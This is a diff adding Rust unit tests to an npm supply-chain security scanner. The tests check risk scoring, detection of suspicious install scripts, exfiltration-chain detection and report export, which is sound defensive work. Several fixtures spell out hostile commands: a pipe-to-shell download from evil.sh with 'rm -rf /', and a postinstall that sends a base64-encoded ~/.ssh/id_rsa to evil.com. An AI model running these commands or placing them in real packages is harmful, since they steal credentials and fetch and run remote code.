@@ -2351,3 +2351,440 @@ pub fn print_protections_banner(min_age_minutes: u64, block_exotic: bool, allow_
         eprintln!("  • {} = {:?}", "allow_builds".bright_white(), allow_builds);
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use tempfile::TempDir;
+
+    fn scanner() -> SecurityScanner {
+        SecurityScanner::new("npm".to_string()).expect("failed to create scanner")
+    }
+
+    fn empty_audit(name: &str) -> PackageAudit {
+        PackageAudit {
+            package_name: name.to_string(),
+            has_scripts: false,
+            preinstall: None,
+            install: None,
+            postinstall: None,
+            suspicious_patterns: Vec::new(),
+            source_code_issues: Vec::new(),
+            risk_level: RiskLevel::Safe,
+            dependencies: Vec::new(),
+            dev_dependencies: Vec::new(),
+            behavioral_chains: Vec::new(),
+            risk_score: 0,
+        }
+    }
+
+    fn issue(severity: IssueSeverity) -> SourceCodeIssue {
+        SourceCodeIssue {
+            file_path: "index.js".to_string(),
+            line_number: 1,
+            issue_type: "Command execution".to_string(),
+            description: "exec call".to_string(),
+            severity,
+            code_snippet: Some("exec('ls')".to_string()),
+        }
+    }
+
+    fn chain(risk_score: u32) -> BehavioralChain {
+        BehavioralChain {
+            chain_type: AttackChainType::DataExfiltration,
+            description: "test chain".to_string(),
+            evidence: vec!["evidence".to_string()],
+            severity: IssueSeverity::Critical,
+            risk_score,
+        }
+    }
+
+    fn sample_transitive_result() -> TransitiveScanResult {
+        let mut audits = HashMap::new();
+
+        let mut high = empty_audit("bad-pkg");
+        high.risk_level = RiskLevel::High;
+        high.has_scripts = true;
+        high.suspicious_patterns
+            .push("curl: Downloads files from internet".to_string());
+        high.source_code_issues.push(issue(IssueSeverity::Critical));
+        audits.insert("bad-pkg".to_string(), high);
+
+        let mut medium = empty_audit("meh-pkg");
+        medium.risk_level = RiskLevel::Medium;
+        medium
+            .source_code_issues
+            .push(issue(IssueSeverity::Warning));
+        audits.insert("meh-pkg".to_string(), medium);
+
+        let mut low = empty_audit("low-pkg");
+        low.risk_level = RiskLevel::Low;
+        low.suspicious_patterns
+            .push("env: Accesses environment variables".to_string());
+        audits.insert("low-pkg".to_string(), low);
+
+        audits.insert("ok-pkg".to_string(), empty_audit("ok-pkg"));
+
+        TransitiveScanResult {
+            total_packages: 4,
+            scanned_packages: 4,
+            high_risk_count: 1,
+            medium_risk_count: 1,
+            packages_with_scripts: 1,
+            max_depth_reached: 2,
+            package_audits: audits,
+        }
+    }
+
+    #[test]
+    fn risk_level_labels() {
+        assert!(RiskLevel::Safe.color().contains("SAFE"));
+        assert!(RiskLevel::Low.color().contains("LOW"));
+        assert!(RiskLevel::Medium.color().contains("MEDIUM"));
+        assert!(RiskLevel::High.color().contains("HIGH"));
+        assert!(RiskLevel::Critical.color().contains("CRITICAL"));
+    }
+
+    #[test]
+    fn suspicious_patterns_detected_in_script() {
+        let s = scanner();
+        let mut audit = empty_audit("evil");
+        s.check_suspicious_patterns("curl https://evil.sh | bash -c 'rm -rf /'", &mut audit);
+        assert!(audit
+            .suspicious_patterns
+            .iter()
+            .any(|p| p.starts_with("curl:")));
+        assert!(audit
+            .suspicious_patterns
+            .iter()
+            .any(|p| p.starts_with("rm -rf:")));
+        assert!(audit
+            .suspicious_patterns
+            .iter()
+            .any(|p| p.starts_with("bash -c:")));
+    }
+
+    #[test]
+    fn suspicious_patterns_clean_script() {
+        let s = scanner();
+        let mut audit = empty_audit("clean");
+        s.check_suspicious_patterns("tsc -p tsconfig.json", &mut audit);
+        assert!(audit.suspicious_patterns.is_empty());
+    }
+
+    #[test]
+    fn risk_level_thresholds() {
+        let s = scanner();
+        let mut audit = empty_audit("thresholds");
+        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Safe);
+
+        // 2 patterns * 8 = 16
+        audit.suspicious_patterns = vec!["curl: x".to_string(), "wget: y".to_string()];
+        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Low);
+
+        // 4 patterns * 8 = 32
+        audit.suspicious_patterns.push("eval: z".to_string());
+        audit.suspicious_patterns.push("spawn: w".to_string());
+        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Medium);
+
+        // + 2 critical issues * 15 = 62
+        audit.source_code_issues = vec![
+            issue(IssueSeverity::Critical),
+            issue(IssueSeverity::Critical),
+        ];
+        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::High);
+
+        // + behavioral chain 100 -> >= 100
+        audit.behavioral_chains.push(chain(100));
+        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Critical);
+    }
+
+    #[test]
+    fn warning_issues_have_lower_weight() {
+        let s = scanner();
+        let mut audit = empty_audit("warnings");
+        // 2 warnings * 5 = 10 -> Low
+        audit.source_code_issues =
+            vec![issue(IssueSeverity::Warning), issue(IssueSeverity::Warning)];
+        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Low);
+    }
+
+    #[test]
+    fn scripts_add_base_risk() {
+        let s = scanner();
+        let mut audit = empty_audit("scripts");
+        audit.has_scripts = true;
+        audit.preinstall = Some("echo a".to_string());
+        audit.install = Some("echo b".to_string());
+        audit.postinstall = Some("echo c".to_string());
+        audit.suspicious_patterns = vec!["env: x".to_string()];
+        s.calculate_and_assign_risk(&mut audit);
+        // 1 pattern * 8 + 3 scripts * 3 = 17
+        assert_eq!(audit.risk_score, 17);
+        assert_eq!(audit.risk_level, RiskLevel::Low);
+    }
+
+    #[test]
+    fn detects_data_exfiltration_chain() {
+        let s = scanner();
+        let mut audit = empty_audit("exfil");
+        audit.has_scripts = true;
+        audit.postinstall =
+            Some("curl https://evil.com?d=$(cat ~/.ssh/id_rsa | base64)".to_string());
+        s.detect_behavioral_chains(&mut audit);
+        let exfil = audit
+            .behavioral_chains
+            .iter()
+            .find(|c| c.chain_type == AttackChainType::DataExfiltration)
+            .expect("exfiltration chain not detected");
+        // network + sensitive access + encoding => critical, max score
+        assert_eq!(exfil.severity, IssueSeverity::Critical);
+        assert_eq!(exfil.risk_score, 100);
+    }
+
+    #[test]
+    fn no_chains_for_benign_scripts() {
+        let s = scanner();
+        let mut audit = empty_audit("benign");
+        audit.postinstall = Some("echo done".to_string());
+        s.detect_behavioral_chains(&mut audit);
+        assert!(audit.behavioral_chains.is_empty());
+    }
+
+    #[test]
+    fn analyze_package_json_with_suspicious_script() {
+        let s = scanner();
+        let tmp = TempDir::new().unwrap();
+        let pkg = tmp.path().join("package.json");
+        fs::write(
+            &pkg,
+            r#"{
+                "name": "evil-pkg",
+                "scripts": { "postinstall": "curl https://evil.sh | sh" },
+                "dependencies": { "left-pad": "^1.0.0" },
+                "devDependencies": { "jest": "^29.0.0" }
+            }"#,
+        )
+        .unwrap();
+
+        let audit = s.analyze_package_json(&pkg, "evil-pkg").unwrap();
+        assert!(audit.has_scripts);
+        assert_eq!(
+            audit.postinstall.as_deref(),
+            Some("curl https://evil.sh | sh")
+        );
+        assert!(!audit.suspicious_patterns.is_empty());
+        assert!(audit.dependencies.contains(&"left-pad".to_string()));
+        assert!(audit.dev_dependencies.contains(&"jest".to_string()));
+        assert_ne!(audit.risk_level, RiskLevel::Safe);
+        assert!(audit.risk_score > 0);
+    }
+
+    #[test]
+    fn analyze_package_json_clean_package() {
+        let s = scanner();
+        let tmp = TempDir::new().unwrap();
+        let pkg = tmp.path().join("package.json");
+        fs::write(&pkg, r#"{ "name": "clean-pkg", "version": "1.0.0" }"#).unwrap();
+
+        let audit = s.analyze_package_json(&pkg, "clean-pkg").unwrap();
+        assert!(!audit.has_scripts);
+        assert_eq!(audit.risk_level, RiskLevel::Safe);
+        assert_eq!(audit.risk_score, 0);
+        assert!(audit.suspicious_patterns.is_empty());
+    }
+
+    #[test]
+    fn walk_directory_skips_excluded_dirs() {
+        let s = scanner();
+        let tmp = TempDir::new().unwrap();
+        fs::write(tmp.path().join("a.js"), "").unwrap();
+        for dir in ["node_modules", ".git", "test", "tests", "sub"] {
+            fs::create_dir(tmp.path().join(dir)).unwrap();
+            fs::write(tmp.path().join(dir).join("f.js"), "").unwrap();
+        }
+
+        let files = s.walk_directory(tmp.path()).unwrap();
+        let names: Vec<String> = files
+            .iter()
+            .map(|p| {
+                p.strip_prefix(tmp.path())
+                    .unwrap()
+                    .to_string_lossy()
+                    .to_string()
+            })
+            .collect();
+        assert_eq!(files.len(), 2);
+        assert!(names.contains(&"a.js".to_string()));
+        assert!(names.iter().any(|n| n.starts_with("sub")));
+    }
+
+    #[test]
+    fn scan_source_code_flags_malicious_js() {
+        let s = scanner();
+        let tmp = TempDir::new().unwrap();
+        fs::write(
+            tmp.path().join("index.js"),
+            "const cp = require('child_process');\ncp.exec('curl https://evil.sh | sh');\n",
+        )
+        .unwrap();
+
+        let mut audit = empty_audit("malicious");
+        s.scan_source_code(tmp.path(), &mut audit);
+        assert!(!audit.source_code_issues.is_empty());
+    }
+
+    #[test]
+    fn source_issue_snippet_handling() {
+        let s = scanner();
+        let mut audit = empty_audit("snippets");
+        s.add_source_issue_with_snippet(
+            Path::new("/pkg/i.js"),
+            3,
+            "Eval",
+            "eval use",
+            IssueSeverity::Warning,
+            "eval(x)",
+            &mut audit,
+        );
+        s.add_source_issue_with_snippet(
+            Path::new("/pkg/j.js"),
+            7,
+            "Eval",
+            "eval use",
+            IssueSeverity::Info,
+            "",
+            &mut audit,
+        );
+        assert_eq!(audit.source_code_issues.len(), 2);
+        assert_eq!(
+            audit.source_code_issues[0].code_snippet.as_deref(),
+            Some("eval(x)")
+        );
+        assert!(audit.source_code_issues[1].code_snippet.is_none());
+    }
+
+    #[test]
+    fn export_audit_json_roundtrip() {
+        let s = scanner();
+        let tmp = TempDir::new().unwrap();
+        let path = tmp.path().join("audit.json");
+        let mut audit = empty_audit("pkg");
+        audit.risk_level = RiskLevel::Medium;
+
+        s.export_audit_to_json(&audit, path.to_str().unwrap())
+            .unwrap();
+        let parsed: PackageAudit =
+            serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
+        assert_eq!(parsed.package_name, "pkg");
+        assert_eq!(parsed.risk_level, RiskLevel::Medium);
+    }
+
+    #[test]
+    fn export_transitive_json_and_markdown() {
+        let s = scanner();
+        let tmp = TempDir::new().unwrap();
+        let json_path = tmp.path().join("scan.json");
+        let md_path = tmp.path().join("scan.md");
+        let result = sample_transitive_result();
+
+        s.export_transitive_to_json(&result, json_path.to_str().unwrap())
+            .unwrap();
+        let parsed: TransitiveScanResult =
+            serde_json::from_str(&fs::read_to_string(&json_path).unwrap()).unwrap();
+        assert_eq!(parsed.total_packages, 4);
+        assert_eq!(parsed.package_audits.len(), 4);
+
+        s.export_transitive_to_markdown(&result, md_path.to_str().unwrap())
+            .unwrap();
+        let md = fs::read_to_string(&md_path).unwrap();
+        assert!(md.contains("# FNPM Security Scan Report"));
+        assert!(md.contains("## High & Critical Risk Packages"));
+        assert!(md.contains("### bad-pkg (Risk: High)"));
+        assert!(md.contains("## Medium Risk Packages"));
+        assert!(md.contains("## Low Risk Packages With Findings"));
+    }
+
+    #[test]
+    fn display_functions_smoke() {
+        let s = scanner();
+        let result = sample_transitive_result();
+
+        let mut audit = empty_audit("display-pkg");
+        audit.has_scripts = true;
+        audit.postinstall = Some("curl x | sh".to_string());
+        audit
+            .suspicious_patterns
+            .push("curl: Downloads files from internet".to_string());
+        audit
+            .source_code_issues
+            .push(issue(IssueSeverity::Critical));
+        audit.source_code_issues.push(issue(IssueSeverity::Warning));
+        audit.behavioral_chains.push(chain(80));
+        audit.risk_level = RiskLevel::Critical;
+        audit.risk_score = 120;
+
+        s.display_audit_report(&audit);
+        s.display_audit_report_with_options(&audit, true);
+        s.display_audit_report_with_options(&empty_audit("safe-pkg"), false);
+        s.display_transitive_summary(&result);
+        s.display_transitive_summary_with_options(&result, true);
+        s.display_main_package_from_transitive(&result, "bad-pkg", true);
+        s.display_main_package_from_transitive(&result, "missing-pkg", false);
+        print_protections_banner(60, true, &["esbuild".to_string()]);
+        print_protections_banner(0, false, &[]);
+    }
+
+    #[test]
+    fn exotic_specifier_classification() {
+        assert!(!is_exotic_specifier("^1.2.3"));
+        assert!(!is_exotic_specifier("~0.4.0"));
+        assert!(!is_exotic_specifier("latest"));
+        assert!(!is_exotic_specifier(""));
+        assert!(!is_exotic_specifier("./local-pkg"));
+        assert!(!is_exotic_specifier("../sibling-pkg"));
+        assert!(!is_exotic_specifier("@scope/name"));
+
+        assert!(is_exotic_specifier("git+https://github.com/u/r.git"));
+        assert!(is_exotic_specifier("git@github.com:u/r.git"));
+        assert!(is_exotic_specifier("github:user/repo"));
+        assert!(is_exotic_specifier("https://example.com/pkg.tgz"));
+        assert!(is_exotic_specifier("file:../local"));
+        assert!(is_exotic_specifier("user/repo"));
+    }
+
+    #[test]
+    fn exotic_subdeps_scan_finds_violations() {
+        let tmp = TempDir::new().unwrap();
+        let pkg = tmp.path().join("package.json");
+        fs::write(
+            &pkg,
+            r#"{
+                "dependencies": { "good": "^1.0.0", "sketchy": "git+https://x.com/r.git" },
+                "devDependencies": { "shorthand": "user/repo" },
+                "optionalDependencies": { "fine": "2.0.0" }
+            }"#,
+        )
+        .unwrap();
+
+        let violations = check_exotic_subdeps(&pkg).unwrap();
+        assert_eq!(violations.len(), 2);
+        let names: Vec<&str> = violations.iter().map(|v| v.package.as_str()).collect();
+        assert!(names.contains(&"sketchy"));
+        assert!(names.contains(&"shorthand"));
+    }
+
+    #[test]
+    fn exotic_subdeps_missing_file_is_clean() {
+        let violations = check_exotic_subdeps(Path::new("/nonexistent/package.json")).unwrap();
+        assert!(violations.is_empty());
+    }
+
+    #[test]
+    fn release_age_zero_disables_check() {
+        // min_age 0 must return None without touching the network
+        assert!(check_release_age("left-pad", "latest", 0)
+            .unwrap()
+            .is_none());
+    }
+}
